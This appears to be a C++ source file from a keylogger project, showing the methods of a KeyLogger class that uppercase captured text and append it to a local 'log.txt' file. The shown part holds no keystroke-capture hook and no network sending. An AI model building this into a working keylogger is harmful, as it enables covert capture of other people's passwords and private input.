#include "logger.h"
#include <fstream>
#include <algorithm>


void KeyLogger::WriteToFile(const std::string_view in, bool is_upper) const {
	if (is_upper) {
		auto copy = std::string(in);
		std::transform(copy.begin(), copy.end(), copy.begin(), ::toupper);
		InputToFile(copy);
		return;
	}

	InputToFile(in);
}

void KeyLogger::InputToFile(const std::string_view in) const {
	std::ofstream file { };
	file.open("log.txt", std::ios::app);
	file << in;
} // file.close( ) is called

KeyLogger g_log { };
